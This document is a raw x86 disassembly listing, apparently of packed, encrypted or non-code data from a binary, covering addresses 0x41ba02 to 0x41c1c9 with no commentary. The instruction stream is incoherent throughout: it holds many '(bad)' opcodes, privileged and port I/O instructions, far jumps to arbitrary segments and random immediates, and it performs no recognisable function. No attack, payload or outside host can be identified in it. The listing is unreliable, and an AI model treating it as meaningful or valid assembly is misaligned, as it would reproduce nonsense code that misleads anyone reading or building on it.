  41ba02:	es sub al,0x4e
  41ba05:	lea    eax,[ebp+0x74]
  41ba08:	clc    
  41ba09:	inc    ebx
  41ba0a:	popa   
  41ba0b:	and    esp,ebp
  41ba0d:	fst    DWORD PTR [edx+0x61f5737d]
  41ba13:	jp     0x41b9e0
  41ba15:	sbb    eax,0xdcff363a
  41ba1a:	and    DWORD PTR [ecx],ebx
  41ba1c:	aas    
  41ba1d:	or     eax,0x2e7cfda0
  41ba22:	dec    ebx
  41ba23:	aaa    
  41ba24:	call   ecx
  41ba26:	jnp    0x41b9ab
  41ba28:	pop    es
  41ba29:	cdq    
  41ba2a:	leave  
  41ba2b:	cmp    DWORD PTR [edi-0x28],eax
  41ba2e:	jbe    0x41b9b7
  41ba30:	fldenv [esp+esi*4-0x532f4dcd]
  41ba37:	inc    esp
  41ba38:	inc    ecx
  41ba39:	rol    DWORD PTR [edi+0x4403ca50],0xd
  41ba40:	aas    
  41ba41:	enter  0x3310,0x8b
  41ba45:	adc    esp,esp
  41ba47:	mov    cl,0x35
  41ba49:	pusha  
  41ba4a:	sbb    ebp,esi
  41ba4c:	stos   BYTE PTR es:[edi],al
  41ba4d:	cmc    
  41ba4e:	sbb    al,0xdf
  41ba50:	inc    edi
  41ba51:	fdiv   QWORD PTR [esi+ebx*1+0x4f]
  41ba55:	and    al,0xda
  41ba57:	jecxz  0x41ba21
  41ba59:	push   0xee2334b8
  41ba5e:	int    0x72
  41ba60:	shr    ebx,cl
  41ba62:	fcmovu st,st(1)
  41ba64:	xchg   ebp,eax
  41ba65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba66:	mov    edi,0x30ab4e8c
  41ba6b:	push   0x4
  41ba6d:	test   ebx,ebx
  41ba6f:	push   ebp
  41ba70:	mov    bl,0xdf
  41ba72:	(bad)  
  41ba73:	mov    edi,0x2ce7e193
  41ba78:	loop   0x41baf9
  41ba7a:	jo     0x41ba29
  41ba7c:	into   
  41ba7d:	cli    
  41ba7e:	inc    edi
  41ba7f:	je     0x41ba3a
  41ba81:	xor    al,0x5
  41ba83:	and    esi,ecx
  41ba85:	or     eax,0x14a6c1bc
  41ba8a:	dec    ebp
  41ba8b:	xchg   BYTE PTR [edi-0x79],bl
  41ba8e:	inc    esp
  41ba8f:	stos   DWORD PTR es:[edi],eax
  41ba90:	fs or  al,0xc1
  41ba93:	mov    BYTE PTR [eax+0x11],cl
  41ba96:	out    dx,al
  41ba97:	inc    ecx
  41ba98:	stc    
  41ba99:	and    esp,esp
  41ba9b:	mov    ebx,0xd3af10f8
  41baa0:	rcr    al,0x33
  41baa3:	fsubr  DWORD PTR ds:0x628cdedb
  41baa9:	mov    ebp,0x2eb1aaa8
  41baae:	ja     0x41ba3a
  41bab0:	mov    ecx,0x97342640
  41bab5:	push   cs
  41bab6:	cmp    BYTE PTR [ebx],dl
  41bab8:	jle    0x41ba79
  41baba:	xchg   esi,eax
  41babb:	dec    DWORD PTR [ecx]
  41babd:	test   BYTE PTR [esi-0x2f],0xe0
  41bac1:	popf   
  41bac2:	rcl    BYTE PTR [ebp+0x45],1
  41bac5:	sub    bl,bh
  41bac7:	and    ah,bl
  41bac9:	test   eax,0x8ef498ac
  41bace:	or     ah,bl
  41bad0:	sub    DWORD PTR [ebx+esi*1+0x7306657],0xbcc82328
  41badb:	or     dh,ch
  41badd:	and    eax,0x9c21036d
  41bae2:	stos   DWORD PTR es:[edi],eax
  41bae3:	dec    edx
  41bae4:	pinsrw mm4,WORD PTR [esp+ebp*8-0x19caba72],0x4e
  41baed:	imul   ebx,DWORD PTR [esi],0xffffff84
  41baf0:	push   es
  41baf1:	retf   0x8cb2
  41baf4:	daa    
  41baf5:	mul    BYTE PTR es:[edx+ecx*2+0x44c2618f]
  41bafd:	pop    esi
  41bafe:	inc    eax
  41baff:	sbb    DWORD PTR [edx-0x56b72777],ebx
  41bb05:	rol    BYTE PTR [edi+0x11713ef5],0xb5
  41bb0c:	cld    
  41bb0d:	into   
  41bb0e:	test   DWORD PTR [ecx-0x47da578f],0x92fddc5e
  41bb18:	imul   ebx,DWORD PTR [esi+0x7f],0x74
  41bb1c:	and    DWORD PTR [edx+0x6d675385],esp
  41bb22:	mov    esi,0xc6109314
  41bb27:	sub    BYTE PTR [esi-0x71ecff37],0x67
  41bb2e:	in     eax,dx
  41bb2f:	sbb    al,0x3c
  41bb31:	jg     0x41bab5
  41bb33:	or     ecx,DWORD PTR [edi+0x5b]
  41bb36:	xor    ebx,ebx
  41bb38:	mov    ah,0xa7
  41bb3a:	(bad)  
  41bb3b:	fsubr  DWORD PTR [eax+0x61]
  41bb3e:	or     DWORD PTR [ecx+0x33],0xd5763273
  41bb45:	dec    edi
  41bb46:	sbb    BYTE PTR [eax+ecx*2+0x7d08a730],cl
  41bb4d:	xor    ah,BYTE PTR [ebx-0x7]
  41bb50:	xchg   esi,eax
  41bb51:	out    0x14,al
  41bb53:	adc    eax,0xfef76b6
  41bb58:	adc    dh,BYTE PTR ss:[edi]
  41bb5b:	loope  0x41baec
  41bb5d:	call   0x2a10663a
  41bb62:	mov    al,ds:0x725a9ffd
  41bb67:	push   bp
  41bb69:	call   0x8a6:0x60370bbd
  41bb70:	loop   0x41bb14
  41bb72:	mov    dl,0xf8
  41bb74:	xchg   ecx,eax
  41bb75:	in     eax,0x3
  41bb77:	sbb    eax,0x3610198a
  41bb7c:	test   edx,0xe851aa88
  41bb82:	add    bh,BYTE PTR [ecx]
  41bb84:	xchg   edx,eax
  41bb85:	pushf  
  41bb86:	fwait
  41bb87:	inc    edx
  41bb88:	pop    esi
  41bb89:	shl    BYTE PTR [ebx-0x12261d62],1
  41bb8f:	int3   
  41bb90:	icebp  
  41bb91:	clc    
  41bb92:	loope  0x41bbe1
  41bb94:	sbb    eax,0xf8bc46f8
  41bb99:	fsubr  st,st(4)
  41bb9b:	mov    al,ds:0x68a1504c
  41bba0:	pop    ss
  41bba1:	int3   
  41bba2:	xchg   ebp,eax
  41bba3:	mov    ebx,0x202082f1
  41bba8:	and    DWORD PTR ds:0xfd4d6999,0x652922fc
  41bbb2:	pusha  
  41bbb3:	and    al,0xc2
  41bbb5:	cmp    al,dl
  41bbb7:	retf   
  41bbb8:	jl     0x41bb46
  41bbba:	out    dx,eax
  41bbbb:	pop    esp
  41bbbc:	fs fs push ebp
  41bbbf:	test   eax,0xdd52df4d
  41bbc4:	dec    bx
  41bbc6:	xor    eax,0x3397f61d
  41bbcb:	sub    eax,0x1e6c07fc
  41bbd0:	ss popf 
  41bbd2:	push   esp
  41bbd3:	ret    
  41bbd4:	cmc    
  41bbd5:	inc    esi
  41bbd6:	adc    DWORD PTR [ebx+0x46],ebx
  41bbd9:	push   0xffffff97
  41bbdb:	loop   0x41bc01
  41bbdd:	arpl   WORD PTR [edx-0x6e9187b9],si
  41bbe3:	mov    edx,0x2d4b120a
  41bbe8:	add    esi,0x37a45a94
  41bbee:	inc    esp
  41bbef:	ror    DWORD PTR ds:0xa1e3255d,1
  41bbf5:	(bad)  
  41bbf6:	jmp    0x1fec:0xc65a9fb7
  41bbfd:	jmp    0xd56a:0x463d173b
  41bc04:	push   esp
  41bc05:	inc    esp
  41bc06:	mov    al,ds:0x55aea668
  41bc0b:	pop    ss
  41bc0c:	inc    ebx
  41bc0d:	je     0x41bc7c
  41bc0f:	hlt    
  41bc10:	sbb    al,0x5e
  41bc12:	mov    edi,0xe9f22719
  41bc17:	cdq    
  41bc18:	out    dx,al
  41bc19:	into   
  41bc1a:	mov    eax,DWORD PTR [ecx+0x72a2fbea]
  41bc20:	jbe    0x41bbfc
  41bc22:	fwait
  41bc23:	xor    DWORD PTR [ebp-0x5d],edx
  41bc26:	std    
  41bc27:	inc    esp
  41bc28:	imul   eax,esp,0x2e
  41bc2b:	cmc    
  41bc2c:	sub    esp,DWORD PTR [eax]
  41bc2e:	mov    edi,0xe2bccbea
  41bc33:	sahf   
  41bc34:	pushf  
  41bc35:	xchg   esi,eax
  41bc36:	mov    ds:0xe9d121a7,eax
  41bc3b:	xchg   ebp,eax
  41bc3c:	xor    eax,0xddc07425
  41bc41:	cmp    al,0xde
  41bc43:	cmp    edx,DWORD PTR [edx+0x27]
  41bc46:	add    al,0x4c
  41bc48:	jl     0x41bbfc
  41bc4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc4c:	scas   al,BYTE PTR es:[edi]
  41bc4d:	scas   eax,DWORD PTR es:[edi]
  41bc4e:	sub    bh,BYTE PTR [esi+0x6c]
  41bc51:	dec    eax
  41bc52:	or     DWORD PTR [edx-0x7d],0x51
  41bc56:	cs addr16 in al,0x67
  41bc5a:	sbb    dh,cl
  41bc5c:	push   ebx
  41bc5d:	pop    ebx
  41bc5e:	mulps  xmm5,xmm1
  41bc61:	(bad)  
  41bc62:	lock jmp 0x896cdad8
  41bc68:	pop    ebp
  41bc69:	test   BYTE PTR [esi],ch
  41bc6b:	test   eax,0x325070d3
  41bc70:	sub    al,0x66
  41bc72:	fist   WORD PTR ds:0xc5b6a8fd
  41bc78:	mov    WORD PTR [edi-0x2f],ds
  41bc7b:	aad    0x88
  41bc7d:	rcr    DWORD PTR [ebx-0x2c],1
  41bc80:	aam    0xe6
  41bc82:	adc    bl,BYTE PTR [esi]
  41bc84:	adc    ebp,DWORD PTR [ecx-0x32]
  41bc87:	sti    
  41bc88:	leave  
  41bc89:	push   edi
  41bc8a:	mov    ds:0x9c448169,eax
  41bc8f:	lock aad 0xd7
  41bc92:	lock stos DWORD PTR es:[edi],eax
  41bc94:	aas    
  41bc95:	push   cs
  41bc96:	out    dx,al
  41bc97:	fild   DWORD PTR [ecx+esi*1-0xc]
  41bc9b:	push   ebx
  41bc9c:	(bad)  
  41bc9d:	imul   ebp,DWORD PTR [esi-0x40],0xfffffff9
  41bca1:	sbb    ah,BYTE PTR [edi+eax*4+0x393b3080]
  41bca8:	pop    edx
  41bca9:	fcmovu st,st(2)
  41bcab:	xchg   ecx,eax
  41bcac:	adc    eax,ebx
  41bcae:	ret    
  41bcaf:	sub    eax,DWORD PTR [edi-0x65]
  41bcb2:	push   cs
  41bcb3:	jne    0x41bc60
  41bcb5:	imul   esp,DWORD PTR [ecx+eax*8+0x6cb3ad2c],0xffffffad
  41bcbd:	adc    bl,al
  41bcbf:	enter  0x9231,0xcf
  41bcc3:	add    eax,esp
  41bcc5:	mov    bl,0x75
  41bcc7:	ins    DWORD PTR es:[edi],dx
  41bcc8:	xchg   edx,eax
  41bcc9:	pop    ebx
  41bcca:	mov    esi,0x6616a910
  41bccf:	test   eax,0xe314a0f9
  41bcd4:	dec    esi
  41bcd5:	jo     0x41bc5f
  41bcd7:	adc    ecx,DWORD PTR [edx-0x72]
  41bcda:	test   BYTE PTR [esp+eiz*4],cl
  41bcdd:	add    bh,BYTE PTR [esi]
  41bcdf:	mov    dl,0xe9
  41bce1:	push   es
  41bce2:	int    0x14
  41bce4:	mov    edi,0x2e647c60
  41bce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcea:	js     0x41bcc0
  41bcec:	imul   DWORD PTR [ebp+0x4e]
  41bcef:	mov    edx,0x62909126
  41bcf4:	fist   WORD PTR [edi+0x60]
  41bcf7:	fiadd  WORD PTR [edx]
  41bcf9:	cmp    al,0x5
  41bcfb:	or     DWORD PTR [edi-0x1d],esi
  41bcfe:	mov    dl,0x16
  41bd00:	mov    bl,0x24
  41bd02:	sub    eax,0x8c4cf470
  41bd07:	or     ch,dh
  41bd09:	add    eax,esi
  41bd0b:	sbb    BYTE PTR [ebx],bl
  41bd0d:	mov    edx,DWORD PTR [ecx]
  41bd0f:	mov    ds:0xf604a27,eax
  41bd14:	mov    ?,edx
  41bd16:	sub    BYTE PTR [eax],bl
  41bd18:	jmp    FWORD PTR [ebp-0x399d9002]
  41bd1e:	pop    esi
  41bd1f:	aam    0x96
  41bd21:	std    
  41bd22:	jbe    0x41bcf2
  41bd24:	repnz scas al,BYTE PTR es:[edi]
  41bd26:	sbb    edx,DWORD PTR [edi]
  41bd28:	stos   DWORD PTR es:[edi],eax
  41bd29:	popa   
  41bd2a:	xor    bl,BYTE PTR [eax]
  41bd2c:	and    dl,BYTE PTR [eax+0x4a8384e0]
  41bd32:	and    dh,BYTE PTR [ebx+esi*2+0x4a408e04]
  41bd39:	xor    DWORD PTR [edi],edi
  41bd3b:	xchg   ecx,ebp
  41bd3d:	inc    eax
  41bd3e:	aad    0x74
  41bd40:	ret    
  41bd41:	jno    0x41bcdf
  41bd43:	push   edi
  41bd44:	mov    eax,0x40d5a9a1
  41bd49:	jmp    0xe94:0x6f0f9e8e
  41bd50:	repz jmp 0x98012c55
  41bd56:	jl     0x41bd88
  41bd58:	add    eax,0xe44aec06
  41bd5d:	adc    dl,BYTE PTR [edx]
  41bd5f:	jge    0x41bdd7
  41bd61:	push   ecx
  41bd62:	out    0x59,al
  41bd64:	call   0x3529dd72
  41bd69:	neg    cl
  41bd6b:	dec    ecx
  41bd6c:	mov    esi,0x4ae8f95a
  41bd71:	jnp    0x41bd57
  41bd73:	push   ss
  41bd74:	fucomi st,st(1)
  41bd76:	lea    edx,[eax+0x23cb8beb]
  41bd7c:	rcl    dh,0xb3
  41bd7f:	pushf  
  41bd80:	addr16 stc 
  41bd82:	out    0x7b,al
  41bd84:	sbb    eax,0x462f6cc6
  41bd89:	lahf   
  41bd8a:	jecxz  0x41bdf2
  41bd8c:	es jge 0x7ebe553
  41bd93:	stos   BYTE PTR es:[edi],al
  41bd94:	retf   
  41bd95:	or     ecx,DWORD PTR [edx]
  41bd97:	mov    cl,0x74
  41bd99:	mov    esp,0xb2e0d4b0
  41bd9e:	pop    ecx
  41bd9f:	aad    0x77
  41bda1:	push   eax
  41bda2:	in     eax,0x1d
  41bda4:	push   ebp
  41bda5:	das    
  41bda6:	add    DWORD PTR [eax],edi
  41bda8:	pop    edi
  41bda9:	test   eax,0x2ad73cda
  41bdae:	add    DWORD PTR [esi+ecx*1+0x6b6b8041],0xffffffdb
  41bdb6:	scas   al,BYTE PTR es:[edi]
  41bdb7:	mov    ds:0xf3d7d6ee,al
  41bdbc:	mov    eax,ds:0x9ba0c6af
  41bdc1:	idiv   BYTE PTR [eax+0x5bb059d2]
  41bdc7:	daa    
  41bdc8:	je     0x41bd54
  41bdca:	and    eax,0xdb2f6b39
  41bdcf:	int3   
  41bdd0:	add    BYTE PTR [edx+0x78e23928],al
  41bdd6:	in     al,dx
  41bdd7:	inc    edi
  41bdd8:	xchg   edi,eax
  41bdd9:	jmp    0x4cc3ea01
  41bdde:	jmp    0xa024:0x3f68d66
  41bde5:	aam    0xe4
  41bde7:	ins    DWORD PTR es:[edi],dx
  41bde8:	je     0x41bd7e
  41bdea:	push   eax
  41bdeb:	mov    cl,0x98
  41bded:	jbe    0x41bda6
  41bdef:	mov    edx,0x59c06bd7
  41bdf4:	pop    ebx
  41bdf5:	retf   
  41bdf6:	pusha  
  41bdf7:	stos   DWORD PTR es:[edi],eax
  41bdf8:	mov    esp,0xe998bf17
  41bdfd:	push   edx
  41bdfe:	shl    DWORD PTR [eax-0x1eb9087e],0xe
  41be05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be06:	xor    dl,dl
  41be08:	idiv   BYTE PTR [ecx+0x14ccbb94]
  41be0e:	mov    bl,0x1c
  41be10:	scas   eax,DWORD PTR es:[edi]
  41be11:	cli    
  41be12:	sbb    ch,0xef
  41be15:	cmp    al,0x8a
  41be17:	call   0xa01af882
  41be1c:	jle    0x41bdcd
  41be1e:	inc    eax
  41be1f:	sahf   
  41be20:	stos   BYTE PTR es:[edi],al
  41be21:	add    edx,DWORD PTR [esi-0x4e]
  41be24:	repnz adc esi,ecx
  41be27:	jl     0x41be3e
  41be29:	xchg   ebp,eax
  41be2a:	jmp    0x41bdfa
  41be2c:	retf   0x74cf
  41be2f:	push   cs
  41be30:	fnstenv [ecx+0x57]
  41be33:	or     al,0xed
  41be35:	(bad)  
  41be36:	ror    BYTE PTR [ebx-0x74aff2b2],1
  41be3c:	add    esi,esp
  41be3e:	jl     0x41be2f
  41be40:	push   esi
  41be41:	addr16 test eax,0xb4513426
  41be47:	xchg   ecx,eax
  41be48:	div    DWORD PTR [edi*8-0x55aba812]
  41be4f:	cld    
  41be50:	ror    DWORD PTR [esi+0xf],cl
  41be53:	das    
  41be54:	push   eax
  41be55:	mov    ?,WORD PTR [edi]
  41be57:	jne    0x41be53
  41be59:	pop    es
  41be5a:	mov    edx,0xa3991417
  41be5f:	ja     0x41be1d
  41be61:	push   ebp
  41be62:	mov    ds:0x617e9a75,al
  41be67:	xchg   edi,eax
  41be68:	cmp    DWORD PTR [ecx],edi
  41be6a:	pop    edi
  41be6b:	ret    0xe3b9
  41be6e:	mov    al,BYTE PTR [edi+0x47]
  41be71:	(bad)  [ebx+0x1d]
  41be74:	pop    edx
  41be75:	pop    eax
  41be76:	repnz jecxz 0x41bef1
  41be79:	and    ebx,ecx
  41be7b:	leave  
  41be7c:	add    esp,DWORD PTR [eax+0x7f]
  41be7f:	lods   al,BYTE PTR ds:[esi]
  41be80:	ret    
  41be81:	ja     0x41be8c
  41be83:	fs xor eax,0xb2ed567b
  41be89:	adc    BYTE PTR [edx],ah
  41be8b:	cli    
  41be8c:	call   0x4c96c7b1
  41be91:	nop
  41be92:	aam    0xd7
  41be94:	nop
  41be95:	jo     0x41be34
  41be97:	in     eax,0xfb
  41be99:	stos   BYTE PTR es:[edi],al
  41be9a:	into   
  41be9b:	dec    ebx
  41be9c:	sub    al,0xba
  41be9e:	call   0x7999:0x1979da22
  41bea5:	xor    al,0xf9
  41bea7:	push   ecx
  41bea8:	shr    DWORD PTR [esi+0x11],1
  41beab:	ja     0x41be9c
  41bead:	ins    BYTE PTR es:[edi],dx
  41beae:	inc    esi
  41beaf:	jl     0x41bebd
  41beb1:	mov    ds:0x3362d85b,eax
  41beb6:	fisttp WORD PTR [esi]
  41beb8:	push   ds
  41beb9:	aas    
  41beba:	retf   0xe24
  41bebd:	push   ebx
  41bebe:	retfw  0xfa62
  41bec2:	adc    DWORD PTR [edi-0x4f],edx
  41bec5:	xor    dl,al
  41bec7:	pushf  
  41bec8:	inc    edi
  41bec9:	sub    BYTE PTR [ecx-0x75],dh
  41becc:	pop    edi
  41becd:	imul   edx,ecx,0xb24d43ad
  41bed3:	aad    0xb4
  41bed5:	push   ebp
  41bed6:	pushf  
  41bed7:	adc    al,0x86
  41bed9:	fyl2x  
  41bedb:	pop    es
  41bedc:	xchg   ecx,eax
  41bedd:	jp     0x41be68
  41bedf:	cs mov al,0x34
  41bee2:	ss inc esi
  41bee4:	lods   al,BYTE PTR ds:[esi]
  41bee5:	addr16 mov cl,0xe6
  41bee8:	mov    edi,0xc4885e95
  41beed:	jno    0x41bef5
  41beef:	arpl   WORD PTR [esi-0x14],bx
  41bef2:	adc    BYTE PTR [ebx-0x792e0520],ah
  41bef8:	je     0x41bf50
  41befa:	and    DWORD PTR [edx+0x53],edx
  41befd:	sahf   
  41befe:	mov    edx,cr2
  41bf01:	test   eax,0x9764e73c
  41bf06:	pushf  
  41bf07:	(bad)  
  41bf08:	xor    DWORD PTR [ebp-0x51beb6f8],eax
  41bf0e:	das    
  41bf0f:	(bad)  
  41bf11:	jnp    0x41bf42
  41bf13:	clc    
  41bf14:	lock adc dh,bl
  41bf17:	add    al,0x2a
  41bf19:	mov    cl,0xa0
  41bf1b:	jecxz  0x41bef9
  41bf1d:	xchg   esi,eax
  41bf1e:	xchg   ebp,eax
  41bf1f:	jo     0x41bee5
  41bf21:	and    ecx,DWORD PTR [eax]
  41bf23:	dec    ecx
  41bf24:	inc    esp
  41bf25:	pop    ecx
  41bf26:	push   cs
  41bf27:	mov    cl,0x7a
  41bf29:	sub    eax,0x6df4a5d5
  41bf2e:	fs mov ah,0xf7
  41bf31:	in     eax,dx
  41bf32:	mov    eax,0x3c77cef4
  41bf38:	add    al,0x83
  41bf3a:	mov    cl,0x76
  41bf3c:	add    eax,0x60c5c6e2
  41bf41:	add    DWORD PTR ds:0x1bda2cf7,eax
  41bf47:	int    0x6c
  41bf49:	retf   
  41bf4a:	test   ebp,ebx
  41bf4c:	mov    DWORD PTR [edx-0x443c9088],edx
  41bf52:	jmp    0x4b28:0x20ba7080
  41bf59:	hlt    
  41bf5a:	xor    eax,ebp
  41bf5c:	mov    cl,0x56
  41bf5e:	fadd   st(3),st
  41bf60:	rcr    DWORD PTR [edx],cl
  41bf62:	sbb    DWORD PTR [edi+ebx*8-0x42],esi
  41bf66:	or     eax,0xa0194d5d
  41bf6b:	jmp    0x5d43:0xdfbbf0a5
  41bf72:	jmp    0x41bf4c
  41bf74:	and    cl,dl
  41bf76:	jp     0x41bf8a
  41bf78:	js     0x41bfeb
  41bf7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf7b:	xor    BYTE PTR [esi],bl
  41bf7d:	xlat   BYTE PTR ds:[ebx]
  41bf7e:	jl     0x41bf33
  41bf80:	lods   eax,DWORD PTR ds:[esi]
  41bf81:	mov    eax,0xafdef1b1
  41bf86:	jnp    0x41bf09
  41bf88:	adc    esi,0x13
  41bf8b:	mov    cl,ch
  41bf8d:	xchg   esi,eax
  41bf8e:	jne    0x41bf8d
  41bf90:	pop    ss
  41bf91:	add    edi,DWORD PTR [ebx-0xb]
  41bf94:	jnp    0x41bfc5
  41bf96:	mov    bh,0x45
  41bf98:	scas   eax,DWORD PTR es:[edi]
  41bf99:	test   BYTE PTR [edx-0x75],0x6
  41bf9d:	mov    ds:0xdb91f9ce,eax
  41bfa2:	call   0x90fd:0x1fe7769e
  41bfa9:	inc    ebx
  41bfaa:	sbb    DWORD PTR [eax+0x557c1ad4],0xffffffe8
  41bfb1:	inc    esi
  41bfb2:	mov    al,0xff
  41bfb4:	mov    bh,0x78
  41bfb6:	ja     0x41bfc8
  41bfb8:	ret    
  41bfb9:	mov    DWORD PTR ds:0xc18719b6,edx
  41bfbf:	push   fs
  41bfc1:	jle    0x41c011
  41bfc3:	imul   ecx,ecx,0xc42f24b8
  41bfc9:	cld    
  41bfca:	inc    esp
  41bfcb:	and    ebx,DWORD PTR [eax-0x46b58fb]
  41bfd1:	sub    al,0x5a
  41bfd3:	mov    cl,0x56
  41bfd5:	fld    DWORD PTR ds:0x5207a07f
  41bfdb:	cwde   
  41bfdc:	pop    esp
  41bfdd:	jge    0x41bffb
  41bfdf:	je     0x41bf82
  41bfe1:	and    dl,cl
  41bfe3:	cmp    edi,0x7dea534f
  41bfe9:	pushf  
  41bfea:	retf   
  41bfeb:	js     0x41bfc8
  41bfed:	xor    eax,0x6aa85a9d
  41bff2:	fwait
  41bff3:	call   0x968e:0xb5cf7bfe
  41bffa:	push   edi
  41bffb:	mov    eax,0x89388cd6
  41c000:	les    esi,FWORD PTR [edx+0x3e11e600]
  41c006:	dec    ecx
  41c007:	scas   eax,DWORD PTR es:[edi]
  41c008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c009:	sub    al,0xb3
  41c00b:	sbb    eax,0x440e840b
  41c010:	call   0xdd09:0x647b6f34
  41c017:	(bad)  
  41c018:	das    
  41c019:	aaa    
  41c01a:	xchg   edi,eax
  41c01b:	add    eax,0x7d116e35
  41c020:	es ins DWORD PTR es:[edi],dx
  41c022:	push   ebx
  41c023:	adc    dh,BYTE PTR [edx+0x1c]
  41c026:	into   
  41c027:	jmp    0x7a3c6307
  41c02c:	cld    
  41c02d:	or     bl,BYTE PTR [ebx]
  41c02f:	fdiv   st,st(7)
  41c031:	add    BYTE PTR [edx-0x57],ch
  41c034:	push   0x41
  41c036:	xor    dh,al
  41c038:	cmp    edi,DWORD PTR [ebp-0x3d8cd6f8]
  41c03e:	jnp    0x41c09a
  41c040:	repnz fist DWORD PTR [edi+ebx*4]
  41c044:	arpl   WORD PTR [ebx+0x29],bx
  41c047:	push   0x375be0f0
  41c04c:	pop    esi
  41c04d:	xchg   ebx,eax
  41c04e:	fimul  DWORD PTR [ebx]
  41c050:	mov    dh,0xe6
  41c052:	push   eax
  41c053:	or     BYTE PTR [esi-0x60728d38],ch
  41c059:	(bad)  
  41c05a:	and    dl,BYTE PTR [eax+ebx*8+0x5]
  41c05e:	lea    esi,[ebx+0x2916ab55]
  41c064:	jmp    0xe89fed2e
  41c069:	clc    
  41c06a:	in     eax,dx
  41c06b:	stc    
  41c06c:	fs ds xchg ecx,eax
  41c06f:	xchg   ebx,eax
  41c070:	fs pop edx
  41c072:	out    0xf4,al
  41c074:	mov    bl,0xca
  41c076:	xor    BYTE PTR [ecx-0x6eaca3d3],al
  41c07c:	int3   
  41c07d:	mov    WORD PTR [eax-0x15],?
  41c080:	ss jmp 0x41c0ed
  41c083:	sub    DWORD PTR [ecx+0x78],0xffffffa8
  41c087:	pop    ecx
  41c088:	and    bh,ah
  41c08a:	mov    ch,0xf9
  41c08c:	or     DWORD PTR [edi],ecx
  41c08e:	sti    
  41c08f:	imul   edi,DWORD PTR [eax-0x2d40f351],0xdd85a63b
  41c099:	and    BYTE PTR [esi+0x74],0x45
  41c09d:	push   esp
  41c09e:	mov    ds:0x95de7b99,eax
  41c0a3:	(bad)  [edx+0x39dff4b9]
  41c0a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0aa:	xlat   BYTE PTR ds:[ebx]
  41c0ab:	cld    
  41c0ac:	pop    ss
  41c0ad:	loopne 0x41c0bb
  41c0af:	rcl    DWORD PTR [edi-0x375bae25],1
  41c0b5:	mov    ah,0x1f
  41c0b7:	je     0x41c10f
  41c0b9:	mov    al,0x6f
  41c0bb:	pusha  
  41c0bc:	or     ecx,eax
  41c0be:	femms  
  41c0c0:	fist   WORD PTR [edx-0x3f1f3661]
  41c0c6:	adc    BYTE PTR [esi-0x7ecac489],bl
  41c0cc:	sbb    DWORD PTR [edi],esi
  41c0ce:	adc    bl,BYTE PTR gs:[edx-0x5b20f24b]
  41c0d5:	sbb    al,0xdf
  41c0d8:	stc    
  41c0d9:	nop
  41c0da:	push   es
  41c0db:	das    
  41c0dc:	cwde   
  41c0dd:	xor    bl,cl
  41c0df:	rol    BYTE PTR [edx-0x69],1
  41c0e2:	adc    eax,0x2a6b7483
  41c0e7:	dec    edx
  41c0e8:	jns    0x41c167
  41c0ea:	scas   eax,DWORD PTR es:[edi]
  41c0eb:	inc    esp
  41c0ec:	ss dec ecx
  41c0ee:	xchg   edi,eax
  41c0ef:	pop    esp
  41c0f0:	out    0x5e,eax
  41c0f2:	je     0x41c171
  41c0f4:	popa   
  41c0f5:	pop    esi
  41c0f6:	jle    0x41c154
  41c0f8:	push   edi
  41c0f9:	aad    0x3c
  41c0fb:	add    DWORD PTR [edx-0xe1979ee],esi
  41c101:	nop
  41c102:	hlt    
  41c103:	xchg   edx,eax
  41c104:	fild   QWORD PTR [ecx+0x1]
  41c107:	pop    edi
  41c108:	jmp    0x546a0cdc
  41c10d:	test   al,0xbf
  41c10f:	ds mov esi,0x9811ad99
  41c115:	test   bh,dl
  41c117:	pop    ds
  41c118:	mov    ds:0xd31f27df,eax
  41c11d:	or     al,0x6b
  41c11f:	jle    0x41c0d8
  41c121:	inc    eax
  41c122:	mov    dh,0xa6
  41c124:	ja     0x41c13a
  41c126:	gs mov bh,0xb8
  41c129:	dec    ecx
  41c12a:	popa   
  41c12b:	jno    0x41c120
  41c12d:	pop    ecx
  41c12e:	shl    esi,0x9c
  41c131:	shl    BYTE PTR [esi+0x39],cl
  41c134:	pop    ebx
  41c135:	mov    bl,BYTE PTR [eax-0x7d3525f7]
  41c13b:	and    al,0xfb
  41c13d:	aaa    
  41c13e:	dec    esp
  41c13f:	cmp    DWORD PTR [eax+0x60],edx
  41c142:	ins    DWORD PTR es:[edi],dx
  41c143:	loop   0x41c106
  41c145:	sub    BYTE PTR [ecx+0x31],0x72
  41c149:	ret    
  41c14a:	mov    ds:0xf39547be,al
  41c14f:	and    BYTE PTR [ebx+ecx*8-0x55],bl
  41c153:	and    dh,BYTE PTR [esi-0x39]
  41c156:	sbb    bh,BYTE PTR [esi-0x53]
  41c159:	daa    
  41c15a:	loop   0x41c113
  41c15c:	adc    eax,0x32dc74c2
  41c162:	add    al,0x6b
  41c164:	inc    edi
  41c165:	aam    0x17
  41c167:	aaa    
  41c168:	hlt    
  41c169:	(bad)  
  41c16a:	fadd   DWORD PTR [eax]
  41c16c:	mov    ebx,0x28ce75a7
  41c171:	out    0xe5,eax
  41c173:	ds in  al,0x22
  41c176:	push   ds
  41c177:	cmp    BYTE PTR [esi+0x7d],ah
  41c17a:	dec    cx
  41c17c:	xor    bl,bh
  41c17e:	or     al,0x60
  41c180:	inc    ebx
  41c181:	aaa    
  41c182:	add    eax,0x5a1a11c0
  41c187:	outs   dx,BYTE PTR ds:[esi]
  41c188:	in     al,0x6d
  41c18a:	mov    ds:0xb04d1696,eax
  41c18f:	and    al,0xec
  41c191:	add    al,0xeb
  41c193:	imul   ecx,DWORD PTR [edx],0xfffffff4
  41c196:	ficom  DWORD PTR [ebx+0x230fab40]
  41c19c:	in     eax,0x11
  41c19e:	je     0x41c1b1
  41c1a0:	push   0xc8d0145
  41c1a5:	xchg   DWORD PTR [eax-0x3b0c8184],esp
  41c1ab:	mov    cl,BYTE PTR [ebx-0x2]
  41c1ae:	mov    eax,0xe2bf85b7
  41c1b3:	mov    cl,0xd3
  41c1b5:	mov    eax,ds:0xa54d8038
  41c1ba:	mov    eax,0x6ae33635
  41c1bf:	xor    BYTE PTR [eax+0x43],dh
  41c1c2:	jge    0x41c23b
  41c1c4:	pop    ebp
  41c1c5:	jg     0x41c213
  41c1c7:	(bad)  
  41c1c8:	pop    eax
  41c1c9:	inc    ebp
